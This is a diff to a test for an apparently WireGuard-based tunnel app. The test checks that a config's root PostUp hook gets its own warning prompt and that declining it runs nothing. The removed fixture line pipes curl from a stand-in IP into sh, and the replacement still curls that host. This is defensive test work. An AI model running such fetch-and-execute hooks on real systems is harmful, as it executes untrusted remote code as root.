@@ -642,7 +642,7 @@ class TestConnectDisconnect:
 
     def test_denied_root_hooks_get_their_own_prompt_and_declining_it_runs_nothing(
             self, tunnel, gate, dialogs, tmp_path, monkeypatch):
-        conf = write_conf(tmp_path, "wgh", extra_interface="PostUp = curl -s http://203.0.113.9/x | sh\n")
+        conf = write_conf(tmp_path, "wgh", extra_interface="PostUp = /usr/bin/curl -s http://203.0.113.9/x\n")
         warned = []
         monkeypatch.setattr(QMessageBox, "warning",
                             staticmethod(lambda *a, **k: warned.append(a[2]) or QMessageBox.No))
